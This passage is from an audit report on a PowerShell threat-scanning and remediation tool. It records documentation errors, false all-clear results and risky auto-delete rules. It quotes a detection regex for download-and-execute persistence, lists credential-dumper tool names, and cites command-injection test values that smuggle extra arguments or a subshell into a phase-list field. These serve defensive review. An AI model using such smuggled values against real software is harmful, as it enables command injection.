class, and only reachable on the non-admin path (the server always runs elevated) — but the parameter
has no `[ValidatePattern]` despite accepting only digits, commas, dots and whitespace.

### MISC-4 · Dead data entry
`data/detection_signatures.json` → `rat_config_paths_raw`: `{APPDATA}\Roaming\OpenWith.exe`.
`{APPDATA}` already resolves to `…\AppData\Roaming`, so this expands to `…\AppData\Roaming\Roaming\…`
— cannot exist. Pre-existing (`$env:APPDATA\Roaming\…`), faithfully carried through the token
migration. Should be `{APPDATA}\OpenWith.exe`.

### MISC-5 · Honesty findings get the wrong MITRE badge
Honesty findings use `-Phase "PHASE 0"`, which fails `Resolve-Mitre`'s `$Phase -gt 0` guard
(`ZeroBreach-Server.ps1:388/992`), and `"Scan Coverage"` isn't in `threat_type_map` — so resolution
falls through to `keyword_map` substring matching. `HIVELOCK_*`'s text "TEMPORARY PROFILE" contains
`temp`, so it inherits that keyword's technique. Wrong ATT&CK badge in GUI and exports.

### MISC-6 · `UH_SKIPPED` never reset → duplicated description lines
`ZeroBreach-V23.ps1:1367` is never reset and a truncated enumeration is deliberately never cached
(`:1647`), so repeated `Get-UserHives` calls re-append; `PROFILE_ENUM_TRUNCATED`'s description
(`:2737`) then repeats each skipped profile N times.

### MISC-7 · Reset ownership for `Remediating` is split, with two leaking edges
`ZeroBreach-Server.ps1:1600, 1802, 812-813, 2030-2036`

The runspace **still sets** the flag at `:1600` (now redundant, misleading) and owns the success-path
reset at `:1802`; the handler owns the set and the failure-path resets. No leftover reset admits a
third request during a genuine run, but: (a) **fail-open** — `Start-Runspace:812-813` calls
`BeginInvoke()` *then* `LiveRunspaces.Add(...)`; a throw from that `Add` lands in the new catch, which
clears `Remediating` **while the remediation is already executing**, admitting a second concurrent
run; (b) **fail-stuck** — if `BeginInvoke` succeeds but the pipeline never executes the body
(broken runspace, thread-pool starvation), the `finally` at `:1802` never runs and nobody clears the
flag.

### MISC-8 · `if (tile)` fails open on the mode switch
`app.js:2221` — if the TRIAGE tile is absent (it is injected at runtime by `ensureTriageModeTile()`),
the mode is silently left as-is while `STATE.customPhases` is still applied. Every ≥81 phase in the
filter becomes unreachable and the run is near-empty, banner still claiming TRIAGE.

---

## P7 — Documentation claims that are false or stale

Audited by reading the code behind each claim. These matter because a future session builds on them.

### DOC-1 · **The healthy-box baseline of "8" is stale — post-Phase-90-fix it is 5**
The `8` figure recorded in CLAUDE.md/CHANGELOG **predates the Phase 90 self-detect fix**, and the
artifact it came from contains **zero** `PHASE 0` / "Scan Coverage" findings — so it also predates the
Stage 9 honesty findings described two paragraphs above it in the same CHANGELOG entry. Three
separately-wrong baseline figures are in circulation (**7 / 8 / 50 / 63 / 94**), two of them on
mutually inconsistent bases, and the 94→63 / 92→50 pairs **match no stored artifact** (closest:
QUICK auto=70/P10=68; FULL auto=68/P10=63).

Two of the "remaining 4 by-design items" are not auto-destructive at all
(`TASK_OneDCUpdater`/`TASKFILE_OneDCUpdater` are POSSIBLE+Info; `STARTUP_Ollamalnk` is
POSSIBLE+DeleteFile). The real residual non-Phase-10 set is `RUNKEY_…DELETEME`, `LSA_PPL`,
`NTLM_LEVEL`, and the Outlook `EMAIL_…` payloads.

> **Highest-value single action in this section: re-run a DEEP `-LoadUserHives` baseline on current
> HEAD, on a multi-profile box.** It settles the stale 8, gives the project its first genuinely
> post-fix number, and replaces all of the above with one measured figure.

### DOC-2 · A documented "rule-#1 violation" (P11, Phase 30) never actually fired — and the real bug is unrecorded
`CHANGELOG.md:446-472` claims Phase 30 auto-selected `SCM Event Log Consumer` for `Remove-WmiObject`
"on every healthy Windows box", scored `auto-destructive 1 → 0`. The code-reading half is right, but
the enclosing early-exit was
`if (($wmiFilters.Count + $wmiConsumers.Count + $wmiBindings.Count) -eq 0)` **with no `@()` wrap**.
Run live on PS 5.1 on this box: a single `ManagementObject` swallows `.Count` → sum 0 → early exit →
"WMI SUBSCRIPTIONS CLEAN", zero findings. Corroborated by artifact: the last pre-fix DEEP baseline
(`_20260724_153026`) ran Phase 30 and produced **0** Phase-30 findings on a box that demonstrably
*has* those subscriptions.

So it was **0 → 0**, and the real pre-fix defect was the opposite — **a false "clean"** (see FC-5,
which is the same phase). The `@()` wrap at `Phases-1.ps1:2113-2115` incidentally fixed it, and that
lesson is nowhere recorded. ("**every** WMI event subscription" is also literally false for bindings.)

### DOC-3 · CLAUDE.md's `ALLOW_VETO_RE` rule overstates its own premise
The rule (and `CHANGELOG.md:523-524`, and the code comment at `Phases-1.ps1:581`) says the veto covers
"Phase 10's **entire scope**", making `Test-BenignPath` "structurally incapable" of downgrading there.
The regex (`ZeroBreach-V23.ps1:1109`) is
`'\\(Downloads|Public)\\|\\Temp\\(?!pip-|pip_|build\\)'` — it **exempts** `\Temp\pip-*`, `\Temp\pip_*`
and `\Temp\build\`, and additionally covers `\Public\` (undocumented). More importantly **`INetCache`
is in Phase 10's scope** (`Phases-1.ps1:600`) and contains none of those components, so
`Test-BenignPath` is fully operative there. "Structurally incapable" is too strong and should be
softened to "cannot downgrade under `\Downloads\`, `\Public\`, or `\Temp\` outside the three pip/build
exemptions". Also undocumented: the new `temp_exe_staging_toolcache_paths` patterns are
component-anchored but not **root**-anchored, so `…\Downloads\temp\claude\evil.exe` also downgrades.

### DOC-4 · Superseded statements that read as current
- `CHANGELOG.md:648` (repeated at `HANDOFF.md:100-102`) — *"No phase passes any P10 field yet — the
  schema is live but unexercised"*. **False now**: six live call sites (`Phases-1.ps1:2570-2571, 2590`;
  `Phases-3.ps1:398, 419, 434`; `ZeroBreach-V23.ps1:1710`).
- `CHANGELOG.md:437-438` — *"Phase 90 finding IDs key on the file name, not the full path … left
  alone"*. **False now**: every Phase-90 `Add-Finding` hashes the full path.
- `CHANGELOG.md:485-486` (P4) — *"the shared `WScript.Shell` COM object is now created once and reused;
  Phase 10.5 built a new one per file"*. **Phase 10.5 was never migrated**: `Phases-1.ps1:763`, inside
  the loop opened at `:757`, still does `New-Object -ComObject WScript.Shell` **per file**. The code
  comments at `:43-44` and `:844` also use the past tense wrongly. This is a live perf defect, not just
  a doc error.

### DOC-5 · Wrong numbers
- `CHANGELOG.md:333-336` — "P1 changes finding IDs at roughly **20 sites**" understates by >2×:
  **46** ID prefixes present on both sides with a changed template, plus 9 retired and 10 new. The
  operational advice (re-capture baselines from before `6e3522b`) is unaffected.
- `CHANGELOG.md:498` (P5) — the A14 budget is not a fixed 60 s / 60,000 files; it is
  `60000 + 20000×(profiles−1)` capped 200,000 and `60 + 20×(profiles−1)` capped 150 s
  (`Phases-1.ps1:1055-1056`). 60/60,000 is the single-profile base.
- `CHANGELOG.md:573-575` (P10) — "18 optional named parameters … **all default-empty**":
  `FileAgeHours` and `FileSize` default to `-1` (`ZeroBreach-V23.ps1:588`ff).
- `CHANGELOG.md:585-586` (P10) — "`Confidence` deliberately reuses `Get-DefenderVerdict`'s Tier
  vocabulary verbatim" is a comment, not a contract, and is **already violated**: it is a bare
  `[string]=""` with no `ValidateSet`, and all three live callers pass `"HIGH"`/`"LOW"`, neither of
  which is in the Tier vocabulary.
- `CHANGELOG.md:503-515` (P12) — undisclosed ID churn: Phase 45 went `STICKY_<filename>` →
  `STICKY_$(Get-StableId $af)` (`Phases-1.ps1:3222`), while the sibling Phase-109 paragraph explicitly
  promises ID stability.
- `CHANGELOG.md:629-630` — here-string char counts stale for 2 of 3 (now 2,751 / 28,656 / 23,534).

### DOC-6 · Unverifiable claims
The entire recovered-evidence block (`CHANGELOG.md:186-239`) has **no surviving artifact in
`reports/`**; likewise the harness figures at `:364-365, :386-388, :410, :463-465, :546-548, :637`.
Not necessarily wrong — but not reproducible, and should be labelled as such rather than read as
measured fact.

### Docs — independently confirmed TRUE (safe to build on)
The 139-phase / 1174-finding / 17.8-min / 0-recovered-error DEEP figures; 115/115 integers contiguous
with zero gaps; the "+1 is the victim's Outlook payload" delta; the per-phase auto-destructive tallies;
the Phase 90 self-detect fix as described (5 named rules, 9 extensions, 200-char corroboration, with
`Cobalt_Strike_Beacon` correctly untouched); Stage 8's exactly-one-new `GROUPCAP_*` and 101-item group;
all four Stage 9 honesty findings and the banner relabel; `Get-StableId` = FNV-1a-32 over UTF-8; the 18
Phase-90 signed-binary findings with the exact 15 demoted filenames; the Authenticode-verdict-is-the-gate
rewrite; `DeleteFile`→`Quarantine`; the P12 8-entry superset; P11's fully-`^…$`-anchored allowlists;
**and critically, that the `Test-ProtectedTarget` mirror really is inside the `REMEDIATE_SCRIPT`
here-string** (`ZeroBreach-Server.ps1:1670-1673`). The 140 / 70·40·30 / QUICK-30 / TRIAGE-71 counts
were independently reproduced by AST.

---

## Verified CLEAN — do not re-litigate

Recorded so future sessions don't re-audit these. Each was checked adversarially and passed.

**Build Custom Scan — engine mechanics (AST diff of all 2,202 command nodes, both revisions):**
- All 140 `Show-PhaseHeader` blocks have **byte-identical enclosing-predicate sets** before/after once
  `Test-PhaseGate` is stripped. Extending the diff to every command node: **0 differences either way** —
  no shared setup code moved into or out of a gate.
- **QUICK-ungated header count = 30 before and 30 after**, matching `ZeroBreach-V23.ps1:2555`.
- All 139 innermost `Test-PhaseGate N` match their own block's `PHASE N`; zero duplicates; `PHASE 105+`
  correctly nests inside gate 105.
- All 24 fractionals round-trip exactly through `[double]::TryParse` on live 5.1. No conflation:
  allowlist `105` → `Test-PhaseGate 10.5` = False; allowlist `10` → `10.5` = False.
- 26 traps before, 26 after, identical enclosing conditions — none removed, moved or orphaned.
  (The *semantics* still changed — see REG-1.)
- Every gate is per-phase; no block-level gating anywhere. Block-level setup correctly stayed outside.
- **No `$phases`/`$Phases` assignment exists anywhere in the three modules**, so the new loader param
  cannot be shadowed. No `,$arr`, no bare `(fn)[0]`, no `(try{}catch{})` sub-expression added.
- Inertness: `$global:PHASE_ALLOWLIST` assigned unconditionally at `:2591` before any dot-source;
  empty allowlist → `Test-PhaseGate` returns `$true` for 1, 10.5, 115. An unset global fails **open**.

**Build Custom Scan — server/GUI:**
- **Command injection is genuinely closed.** `ZeroBreach-Server.ps1:1050-1054` trims then requires
  `^[0-9]+(\.[0-9]+)?(,[0-9]+(\.[0-9]+)?)*$`. `[0-9]` (not `\d`) blocks Unicode digits; `.Trim()`
  neutralises the .NET `$`-matches-before-trailing-`\n` quirk. Tested on live 5.1 against 23 payloads
  including `1,2" -Schedule DAILY -SmtpTo a@b.c "`, `1,2$(calc)`, CR/LF injection, backtick, NUL, and
  Arabic-Indic digits — **all rejected**. `"$($ScanConfig.phases)"` stringifies a JSON array to `"1 2"`,
  which fails the regex. `:1081` is the only interpolation site.
- Route gating: `/api/scan/analyze-text` is POST-only with 405, sits behind `Test-RequestAllowed`
  (`:1847`, ahead of the `switch -Regex`), uses `Read-JsonBody`. GUI POSTs through `postJSON()`.
- No catastrophic backtracking — the only nested-quantifier regex is anchored by a mandatory literal
  `.` per repetition; measured 1 ms on 48,801 chars of pathological input forced to total failure.
- XSS clean: pasted text reaches the DOM only via `textContent`; the two `innerHTML` sites interpolate
  only server-side constants from `scan_categories.json`.
- Stale-filter reset is **correct** — cleared on manual mode-tile click (`app.js:497`) and profile load
  (`:568`); `applyCustomScan` bypasses the listener by design. A stale filter cannot silently narrow a
  later scan via those paths.
- `data/scan_categories.json` parses; all 108 distinct phase numbers exist as real headers. (Coverage
  gaps are FC-3, not validity.)

**Data / signatures:**
- **AMSI**: no new malware-signature literal in any `.ps1`. `$YARA_NAME_ONLY_RULES` /
  `$YARA_TEXT_ONLY_EXT` are rule names and extensions; every pattern stayed in data.
- **Attacker-controllable allowlists** (the key evasion class): the three new `wmi_subscription_allow_*`
  entries are fully `^…$`-anchored over a composite that pins `__CLASS` **first** plus the action
  properties. A vendor-shaped *name* alone cannot allowlist anything — a `CommandLineEventConsumer` or
  `ActiveScriptEventConsumer` can never match `^NTEventLogEventConsumer|…`, and the one allowlisted
  consumer class cannot execute code. Escaping correct; `ConvertTo-ZbWmiFlat` strips newlines so `$`
  can't be short-circuited. *Caveat:* `Join-AllowRegex` (`ZeroBreach-V23.ps1:1091`) joins with a bare
  `|`, so one unanchored future entry silently un-anchors the whole list — worth a guard comment.
- `temp_exe_*` lists: component-anchored, downgrade-only to INFO + Info with the finding still
  reported — the CLAUDE.md-mandated shape, trade-off stated in the data comment (but see MISC-2).
- **`{TOKEN}` migration** (the bulk of the 180 changed lines): all five `*_raw` lists are consumed per
  profile via `Expand-UserPathTemplate`, which accepts legacy `$env:`/`%VAR%` spellings and returns
  `$null` on an unresolved token rather than a half-built path. `Get-Sig` returns `@($SIG.$Name)`
  (plain array). **No silent false-CLEAN from the migration.**
- **`mitre_mapping.json`**: `phase_map` covers **all 139** engine phases including every fractional —
  zero missing. Both added `threat_type_map` entries match real `-ThreatType` strings.
- **`permission_baseline.json`**: `accessibility_binaries` removed; both readers now use
  `Get-Sig 'accessibility_binaries'` and each emits an explicit "CHECK SKIPPED, NOT CLEAN" on an empty
  list. Canonical list gained `hh.exe`; tri-state grading. **No false CLEAN, no false CRITICAL.**
  (Stale comment at `Phases-1.ps1:3196-3197` claims Phase 109 still reads the baseline copy — it doesn't.)
- **Stage 9 honesty findings**: `PROFILE_CENSUS_*`, `UNSCANNED_HIVE_*`, `UNREACHABLE_PROFILE_*`,
  `PROFILE_ENUM_TRUNCATED` are all `SEV_INFO` + `Info`; `HIVELOCK_*` is `SEV_HIGH` + `Info` with empty
  FixParam. **None is CRITICAL/HIGH + destructive — no auto-select path exists.** All IDs are
  `Get-StableId`-derived and unique per thing found (census hashes the sorted census string;
  `UNSCANNED_HIVE`/`UNREACHABLE_PROFILE` hash the **SID**; `HIVELOCK` hashes the mount name). Fire
  paths verified, including that `Close-UserHives` runs at `Summary.ps1:15` — before the finding counts
  at `:44` — so `HIVELOCK` does land in the report. The one uncovered path is FC-4.

**All six data files parse cleanly** (`detection_signatures` 184 keys, `mitre` 6, `permission_baseline`
22, `scan_categories` 4, `ioc_defaults` 7, `coverage_matrix` 7).

**Sandbox harness encoding/parse rules all pass** — all three `.ps1` start with `EF BB BF`, contain
**zero** non-ASCII bytes, and `PARSE_OK` on both real `powershell.exe` 5.1 and `pwsh` 7. `.gitignore`
correctly scopes `tools/sandbox-test/work/`. No host execution of malware; `ZBIn` is `<ReadOnly>true`.

---

## P6 — P1 multi-user hive migration

P1 was signed off in CHANGELOG/CLAUDE.md as *"fully live-graded end-to-end; nothing known left open."*
It is not. The **registry half works**; the **filesystem half is effectively a no-op on any
multi-user box**, and it prints green all-clears while being one.

### P1-1 · **The shared `Get-ScanFiles` budget gives profiles 2..N zero filesystem coverage** — and the phase reports clean
`ZeroBreach-V23.ps1:884-885, 935` + ~20 migrated call sites · **FC + REG** · *the headline defect*

Every migrated filesystem site accumulates all profiles' roots and passes them to **one**
`Get-ScanFiles` call (to avoid `N × 20s`). **The caps were never scaled:**
`$global:SCAN_MAX_FILES = 20000`, `$global:SCAN_DEADLINE_S = 20`, and the walk `return`s the instant
the cap is hit, walking roots strictly **in the order given** — profile-major, in SID order.

Replicated exactly (same prune list, same reparse skip) **on this box**:

| root | result |
|---|---|
| `C:\Users\user` | **20,000 files in 1.0 s** |
| `C:\Users\user\AppData\Local` | **20,000 files in 1.4 s** |

**One profile exhausts the entire budget in about a second.** `-TimeScoped` does not save it: under
the default **ALL TIME**, `Test-InScope` returns `$true` unconditionally (`:827`).

Affected: `Phases-3.ps1:1900` (P106), `:1187` (P98), `:1081` (P97), `:888` (P94), `:1400/1475`
(P100.5), `:1655` (P103); `Phases-2.ps1:2224` (P82 tunneling, CRITICAL+DeleteFile), `:2603` (P89
stego), `:255, :597, :1046, :1120, :1849`; `Phases-1.ps1:1289, 1361, 2397, 3086, 3342, 3534, 3614`.
`Phases-3.ps1:1398` appends `$env:PUBLIC`/`$env:ProgramData` *after* every profile, so the
machine-wide staging locations are unreachable too.

**`Get-ScanFiles` returns no truncation signal** — no flag, no out-param — so the phase cannot know it
was cut, and prints `Phases-3.ps1:1916` `[OK] NO SUSPICIOUS DUMP FILES OR DUMPER TOOLS.`,
`Phases-2.ps1:2247` `[OK] NO TUNNELING TOOLS FOUND.`

**Failure.** 3-user terminal server, DEEP. Whoever sorts first by SID burns the cap; users 2 and 3 get
no scriptlet, ClickOnce, stolen-cert, token-staging, archive, credential-dumper, tunneling or stego
scan — **reported as clean.** This is the exact false all-clear P1 exists to remove.

**The correct model is already in-tree**: `Phases-1.ps1:1038-1068` (Phase 12) scales the budget by
profile count, tests for truncation, and emits `PREFETCH_CORR_SKIPPED` rather than concluding.

**Highest-leverage single fix in this entire document:** give `Get-ScanFiles` a truncation signal and
either scale `MaxFiles`/`DeadlineSecs` by root count or interleave roots across profiles (the shape
`Phases-3.ps1:158-185` already uses). **Without it, P1-1, P1-9, P1-10, P6-18 and P6-19 are all the
same defect.**

### P1-2 · Phase 106 `DUMPTOOL` — CRITICAL + `DeleteFile` on signed Microsoft ProcDump, now ×N
`engine/Phases-3.ps1:1893, 1900, 1911` · **R1**

`cred_dump_tools` (`procdump*.exe, dumpert*.exe, memdump*.exe, nanodump*, …`) matched over
`$zbUp.Profile` with **no `-TimeScoped`, no Authenticode gate, no benign-path gate**. Microsoft's
signed **ProcDump** / `procdump64.exe` in `SysinternalsSuite` is standard MSP-technician and developer
kit → CRITICAL + DeleteFile → auto-selected → one `PURGE` deletes it, **per profile**.

This is verbatim the failure Phase 90 documents at `Phases-3.ps1:337-343` and fixed with a sig gate at
`:379-400`. Phase 106 has the same exposure, a **harsher** action (`DeleteFile`, not the prescribed
`Quarantine`), no gate, and P1 extended it from 1 profile to N. Does not fire on this box (procdump
not installed), so **it is not in the recorded baseline of 8**.

### P1-3 · Phase 31 PS-profile persistence — CRITICAL + `DeleteFile` on every developer profile, now 2+6N paths
`engine/Phases-1.ps1:2218-2244, 2249, 2253-2255` · **R1**

```powershell
if ($content -match "IEX|DownloadString|WebClient|Invoke-Expression|Start-Process.*hidden") {
```
→ `$SEV_CRITICAL … -FixAction "DeleteFile" -FixParam $zbProfFile`.

`Invoke-Expression` is the documented init line for **oh-my-posh, starship, zoxide, scoop and
Chocolatey**; `IEX` is an unanchored substring. Pre-P1 this examined 4 `$PROFILE.*` paths; it now
builds two machine paths plus `WindowsPowerShell`/`PowerShell` × three profile filenames under
**every** reachable profile's `Documents`.

**Failure.** A 5-developer workstation running `oh-my-posh init pwsh | Invoke-Expression` produces
**5 auto-selected CRITICAL+DeleteFile findings that delete each user's PowerShell profile on a healthy
box.** The severity is pre-existing; the ×N multiplication is new, and no corroboration gate was added
(Phase 35 got `Get-ProxyPublicIp`, Phase 20 kept its allowlist — this one was migrated with grading
untouched).

### P1-4 · Phase 74 `MACRO_TRUST` — HIGH + `RunCmd` writes into **other users' hives**, auto-selected, ×N
`engine/Phases-2.ps1:974-982` · **R1 (hardening-rule class)**

`$SEV_HIGH` + `RunCmd` *is* the auto-select set, and `$zbMtPath` is now
`Registry::HKEY_USERS\<other-SID>\…\Security`. `ZeroBreach-Server.ps1:450-466` deliberately does not
protect `HKEY_USERS\S-1-5-21-*` (only service hives and `ZB_UH_*`), so on PURGE the server really does
**write into N other people's hives unattended**.

- It contradicts this same file's stated policy for the sibling hardening sites —
  `Phases-2.ps1:1452-1457` and `:1562-1567` both say the write half **stays single-user** because
  "pushing these values into every profile's hive materially widens the blast radius". Phase 74 got no
  such split.
- It writes `VBAWarnings=4` (`:975`) while the 74.7 hardening list uses `2` for the same setting, whose
  data comment says 2 "does NOT break legit internal macros".
- **Failure.** 20-user terminal server whose legacy LOB workbook needs `VBAWarnings=1` → 20
  auto-selected findings → one PURGE silently stops macros for everyone.

Per CLAUDE.md this is the *"hardening actions are operator-only: `Info` or `POSSIBLE` + `RunCmd`"*
rule, not the healthy-box rule — it will not move the baseline of 8.

### P1-5 · Browser-extension ID collides across browsers → silent discard
`engine/Phases-1.ps1:477` · **the one genuine silent-discard in the migration**

```powershell
$zbExtId = "EXT_$($ext.Name)_$(Get-StableId "$($zbHive.Sid)")"
```
`$ext.Name` is the Chrome Web Store extension ID, **identical in Chrome, Edge and Brave** for the same
extension (`:455-458` iterates all three). The migration added the SID and stopped.

**Failure.** User bob has the same known-adware extension in Chrome and Edge; the Chrome copy registers
CRITICAL + `DeleteFile` (`:484`), the Edge copy hits `Add-Finding`'s early `return` and is **silently
discarded and left installed.** Fix is the shape already used at `:678`/`:1376`/`:2278`:
`Get-StableId "$($zbHive.Sid)|$($ext.FullName)"`.

### P1-6 · Console remediation re-mounts every hive and **never unloads it**
`engine/FixMode.ps1:40` + `engine/Summary.ps1:15` · **AVAIL — causes a real user-facing outage**

`Close-UserHives -All` is called exactly once, at `Summary.ps1:15`, which is dot-sourced **before**
`FixMode.ps1`. Choosing `Y` at the fix prompt reaches `FixMode.ps1:40
foreach ($zbHive in @(Get-UserHives))` with the cache cleared and `$global:UH_ALLOW_LOAD` still true →
`reg load` runs again for every logged-off profile. **Nothing unloads them** (no `Close-UserHives`
anywhere in FixMode), and the module ends at a `ReadKey`. `reg load` mounts are machine-wide and
survive process exit.

That is precisely the *"victim's NTUSER.DAT stays locked → TEMPORARY PROFILE at next logon"* outage the
loader comment at `ZeroBreach-V23.ps1:1656-1663` warns about — **re-created by the P1 code itself.**

**Secondary.** If the remount fails for a profile (load cap, hive now locked, deadline), a `DeleteReg`
whose FixParam points at `Registry::HKEY_USERS\ZB_UH_…` silently fails, and `Test-RegValueGone`
(`ZeroBreach-V23.ps1:1990-1993`) hits `if (-not (Test-Path …)) { return 'gone' }` → **"REG VALUE
DELETED" is printed for persistence that is still armed.** The server-side path is correctly guarded
(`ZeroBreach-Server.ps1:464, 1577-1592`); the console path is not.

### P1-7 · Dead code — hitting the hive-load cap produces **no** honesty finding
`ZeroBreach-V23.ps1:1589, 1618-1620` · **FC**

Inside the `elseif`, `$zbLoads < MAX` is guaranteed on entry; a successful load sets `$zbLoaded = $true`
and a failed load leaves `$zbLoads` unchanged. **The condition at `:1618` can never be true.** When
`$zbLoads >= UH_MAX_LOADS` (10) the `elseif` is skipped entirely — nothing added to `UH_SKIPPED`,
`UH_TRUNCATED` not set, so `PROFILE_ENUM_TRUNCATED` never fires. Census case (a) (`:2719`) requires
`-not $global:UH_ALLOW_LOAD`, false in exactly this run.

**Failure.** An 11+-profile box run with `-LoadUserHives`: profiles 11..25 get zero registry coverage
**with no report of it.** A plain `reg load` failure (corrupt hive, ACCESS DENIED, hive in use) at
`:1615` is silent the same way. Compare FC-4 — same class, different path.

### P1-8 · Rollback snapshot exports the wrong class store for reg-loaded users
`engine/FixMode.ps1:46`

`$zbRegRoot` derives from `$zbHive.HivePath` (the NTUSER mount). The loader's own comment
(`ZeroBreach-V23.ps1:1602-1606`) states a reg-loaded NTUSER's `Software\Classes` is **nearly empty**
and the real per-user class registrations live in the separately-mounted `UsrClass.dat` at
`$zbHive.ClassesHivePath` (`ZB_UC_*`) — which Phase 24/21.5 findings actually target. So for
logged-off users the rollback snapshots an empty key: **the same "safety net restores nothing" bug the
`:29-33` comment claims to have fixed, just relocated.**

### P1-9 · Phase 90 `TROJNAME` is structurally dead — live-proven
`engine/Phases-3.ps1:201, 479-480` · **REG**

`$trojSigSw` is `StartNew()` at **phase entry**, before the magic-byte sniff (up to 45 s) and the
content-read loop, so by the time the first candidate is reached the 25 s deadline is long past and
`break` exits the loop — **no finding at all**, not a demotion. The comment at `:213-215` acknowledges
this exact defect on the sibling `$yaraSigSw`, fixes that one (`:216`, cumulative-call-time), and
explicitly leaves this one.

Confirmed from `reports/KrakenConsole_20260727_113431.log`:
`MAGIC-BYTE SNIFF BUDGET REACHED (4000 files / 28.5s)` and `grep -c TROJNAME_` → **0**, against 79
other Phase-90 findings. P1 makes it deterministic (5×N roots guarantee the sniff runs to cap).

### P1-10 · Phase 10's `break` abandons every remaining profile **and both machine roots**, silently
`engine/Phases-1.ps1:591-608, 635, 711` · **FC**

`$targetDirs` went from 6 fixed entries to **4N + 2**, and the migration moved `C:\Windows\Temp` and
`C:\Users\Public\Downloads` to the **end**. `$global:SIG_AUDIT_MAX_FILES` (150) / `_DEADLINE_S` (25)
are unchanged. On exhaustion `break` skips the remaining directories including the PE-masquerade sniff,
and the only output is an `Out-Typewriter` at `:711` — **no `Add-Finding`**, so the durable report
contains no record.

**Failure.** 3-user box where user A's `%TEMP%` holds 150+ non-allowlisted exe-extension files
(npm/pip/VS debris — 500+ measured on this box per the in-code comment); users B and C, Windows TEMP
and Public Downloads are never swept and nothing says so.

### P1-11 · The ransomware coverage caveat is computed and then thrown away
`engine/Phases-1.ps1:3606-3612, 3624, 3629, 3656, 3727` · **FC**

`$zbRansomCaveat` is correctly built (unreachable profiles, redirection ACTIVE/UNKNOWN) but
`$zbRansomNote` is interpolated **only** into the `RANSOM_EXT_` description at `:3624`, which fires only
when something is found. The three clean lines are unconditional:
`[OK] NO RANSOMWARE EXTENSION PATTERNS.` · `[OK] NO SUSPICIOUSLY HIGH ENTROPY FILES FOUND.` ·
`[OK] NO RANSOM NOTE FILES DETECTED.` No honesty finding is emitted either.

**Failure.** On a 20-profile RDS host with 15 unreachable profiles, the operator sees three green
all-clears for a ransomware sweep that covered one profile.

### P1-12 · `-LoadUserHives` is **unreachable from the GUI** — P1's headline capability cannot be enabled from the primary entry point
`ZeroBreach-Server.ps1:1076-1082` · `gui/static/js/app.js`

The server builds the engine args (`-Html`, `-Paranoid`, `-Stealth`, `-IocFile`, `-Phases`, baseline)
and **never adds `-LoadUserHives`**; there is no GUI control and no reference in `app.js`. Only the
console CLI or the `ZB_LOAD_HIVES` env var can turn it on.

So **every GUI scan is blind to logged-off users' registries** (honestly reported via
`UNSCANNED_HIVE_*`, but unfixable from the UI) — and the server's own block message at `:465` advises
the operator to *"re-run with `-LoadUserHives`"*, **a flag the GUI cannot pass.**

### P6 — medium

- **P6-13 · Redirected folders are never reachability-tested.** `Get-UserHives` decides reachability
  once, textual tests first, because *"Test-Path on an unreachable UNC took 42.2 SECONDS"*
  (`ZeroBreach-V23.ps1:1540-1552`) — but only on `ProfileImagePath`. `Get-UserPaths` returns User-Shell-
  Folders values (`Personal`, `Desktop`, …) **untested**, and `Get-ScanFiles`' per-root `Test-Path`
  (`:931`) runs *before* the deadline loop, so the 20 s budget does not bound it. Folder redirection to
  a dead file server × 10 profiles → a single phase stalls for minutes. Same for the bare `Test-Path` at
  `Phases-1.ps1:2247` (up to 6N paths).
- **P6-14 · Phase 63 `MINERCFG`** (`Phases-2.ps1:269`) — CRITICAL + `DeleteFile` gated on an unanchored
  `mining` (matches "deter**mining**", "exa**mining**"), scanning `%TEMP%` where `Test-BenignPath` is
  structurally incapable of downgrading (`$global:ALLOW_VETO_RE`). Weak regex, exposure now ×N.
- **P6-15 · Phase 92 `UACBYPASS`** (`Phases-3.ps1:762-774`) — CRITICAL + `DeleteRegKey` newly reachable
  per mounted profile classes hive. The `RegLoad` branch is correctly capped at HIGH+`Info`; the
  mounted-`HKU` branch is not, and pre-P1 it was structurally incapable of firing. Ungraded — 0 on this
  2-profile box.
- **P6-16 · Unbudgeted `Get-AuthSig` loops** — `Phases-2.ps1:1014` (Office add-ins, nested per-hive ×
  per-add-in, while the sibling XLL loop 20 lines below at `:1052-1059` *was* given the budget by this
  same migration); `Phases-1.ps1:1610` (TypeLib), `:2291`/`:2301` (Startup). Re-introduces the
  documented Authenticode revocation hang.
- **P6-17 · Unbounded registry recursion ×N** — `Phases-2.ps1:2346` `Get-ChildItem -Recurse` over
  `HKU\<SID>\…\CurrentVersion\Installer` (thousands of keys, a P/Invoke per key, no cap);
  `Phases-1.ps1:1590` TypeLib `-Recurse -Depth 4` per profile.
- **P6-18 · Root containment not de-duped**, compounding P1-1 by 2-3×. `Phases-2.ps1:247-251` and
  `:589-593` de-dupe by exact string only, so `Temp` ⊂ `LocalAppData` is walked twice (Phases 82/89 fix
  exactly this with a prefix test at `:2205-2211`/`:2589-2595`; 63/68 did not get it).
  `Phases-3.ps1:1893` passes `Profile` ⊃ `Temp` ⊃/∥ `LocalAppData` — a 3× walk. `Phases-1.ps1:3598`
  adds a **new** overlap: under OneDrive KFM, `Documents`/`Desktop`/`Pictures` resolve *inside* the
  `OneDrive` root, and `Get-ZbUserRootsM1`'s `Select-Object -Unique` (`:138`) is exact-match. Side
  effect: `$yaraHits`/`$global:TrojanHits` increment unconditionally on duplicates while `Add-Finding`
  early-returns, **inflating GUI threat counters** (`Phases-3.ps1:267-272` guards `MASQPE` against this;
  the other sites don't).
- **P6-19 · False "(ALL PROFILES)" clean lines.** `Phases-2.ps1:532`
  `[OK] NO KNOWN ADWARE/PUP REGISTRY KEYS (ALL PROFILES + MACHINE).` and `:2330`
  `[OK] DISALLOWRUN NOT SET (ALL PROFILES).` — both loops `continue` on `-not $zbHive.HivePath`
  (`:508`, `:2317`), i.e. **every logged-off profile in the default configuration.** The parenthetical
  was added by this migration and is false as written.
- **P6-20 · Phase 61 `RATFILE`** (`Phases-2.ps1:79-94`, CRITICAL + `DeleteFile`) is the only migrated
  filesystem site with no root de-duplication; two `ProfileList` SIDs sharing a `ProfileImagePath` (SID
  history / re-created domain account — `Get-UserHives` de-dupes on SID at `:1522`, never on path) yield
  two IDs for one file, the second acting on an already-deleted path.
- **P6-21 · STEALTH footprint.** `ZeroBreach-V23.ps1:2423` calls `Get-UserHives` in the interactive
  banner, which runs *before* the menu sets `$global:STEALTH_MODE` (`:2513`). With `-LoadUserHives`,
  hives are mounted before the operator picks STEALTH — defeating the deliberate late evaluation at
  `:1470-1473`. (`-Stealth` on the command line is fine.)

### P6 — low

- **P6-22 · Owner attribution uses `StartsWith` without a separator anchor** — `Phases-1.ps1:148`,
  `Phases-2.ps1:264/435/618/1065/1128/1142/2231/2610`,
